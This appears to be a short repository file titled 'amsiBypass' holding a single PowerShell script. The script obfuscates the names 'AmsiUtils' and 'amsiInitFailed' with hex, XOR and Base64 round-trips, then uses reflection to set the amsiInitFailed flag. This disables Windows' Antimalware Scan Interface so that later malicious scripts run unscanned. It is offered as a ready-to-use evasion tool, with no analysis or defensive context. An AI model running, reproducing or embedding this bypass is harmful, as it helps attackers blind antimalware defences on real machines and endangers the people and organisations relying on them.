# amsiBypass

```
function X-HxStr {
    param (
        [string]$hxStri,
        [string]$key
    )

    $result = @()
    $hValues = $hxStri -split ' '
    $keyValues = $key.ToCharArray()

    for ($i = 0; $i -lt $hValues.Length; $i++) {
        $xorResult = [convert]::ToByte($hValues[$i], 16) -bxor [char]$keyValues[$i % $keyValues.Length]
        $result += '{0:X2}' -f $xorResult  
    }
    return $result -join ' '  
}

$xK = "1246hhjjjkkgdddd"
function HToS ($hxarr) {
    return ($hxarr -split ' ' | ForEach-Object { [char][convert]::ToInt16($_, 16) }) -join ''
}
$originalAdditionalNamex = "41 6D 73 69 55 74 69 6C 73"
$originalFieldNameH = "61 6D 73 69 49 6E 69 74 46 61 69 6C 65 64"

$additionalNameH = X-HxStr -hxStri $originalAdditionalNamex -key $xK
$fieldNameH = X-HxStr -hxStri $originalFieldNameH -key $xK
$deAdditionalNameH = X-HxStr -hxStri $additionalNameH -key $xK
$decFiNaH = X-HxStr -hxStri $fieldNameH -key $xK

$baseName = 'System.Management.Automation.'
$className = $baseName + (HToS $deAdditionalNameH)
$fieldName = HToS $decFiNaH
$bDecName = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String([Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($className))))
$bDFi = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String([Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($fieldName))))
try {
    [Ref].Assembly.GetType($bDecName).GetField($bDFi,'NonPublic,Static').SetValue($null,$true)
    Write-Host "The field was successfully modified."
} catch {
    Write-Host "An error occurred: $_"
}






```

